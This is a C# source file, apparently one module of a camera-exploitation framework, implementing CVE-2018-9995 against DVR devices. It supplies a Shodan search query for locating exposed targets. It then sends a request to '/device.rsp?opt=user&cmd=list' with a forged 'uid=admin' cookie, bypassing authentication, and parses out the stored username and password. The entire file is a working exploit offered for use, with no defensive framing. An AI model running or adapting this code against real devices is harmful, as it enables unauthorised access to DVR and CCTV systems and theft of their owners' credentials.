using System.Collections.Generic;
using ExploitMaker;

namespace Exploits
{
    public class CVE_2018_9995 : Exploit
    {
        public override string ShodanSearchQuery => "Server: GNU rsp/1.0";

        public override string Description => CommonName + ": Gets DVR Credentials in many vendors that responds using the banner 'Server: GNU rsp/1.0'";

        public override string CommonName => "CVE-2018-9995";

        public override Credencial Run(Camera cam)
        {
            ExploitHelper.Writter.InitTest(CommonName, cam);

            var result = HttpRequester.Get(cam.UrlHttp + "/device.rsp?opt=user&cmd=list", new Dictionary<string, string> {{"uid", "admin"}});

            if (result == null)
            {
                ExploitHelper.Writter.LogError(CommonName, cam, Phrases.IP_Camera_Is_Not_Reachable);
                return null;
            }
            try
            {
                dynamic json = result;
                string username = json.list[0].uid;
                string pass = json.list[0].pwd;

                if (username != null && pass != null)
                {
                    var credencials =  new Credencial(username, pass);
                    ExploitHelper.Writter.TestSuccess(CommonName, cam, credencials);
                    return credencials;
                }

                ExploitHelper.Writter.TestFailed(CommonName, cam);
                return null;
            }
            catch (JsonParserErrorException)
            {
                ExploitHelper.Writter.LogError(CommonName, cam, "Error on parse JSON in the Cam: {0} for Exploit: {1}");
                ExploitHelper.Writter.TestFailed(CommonName, cam);
                return null;
            }
        }
    }
}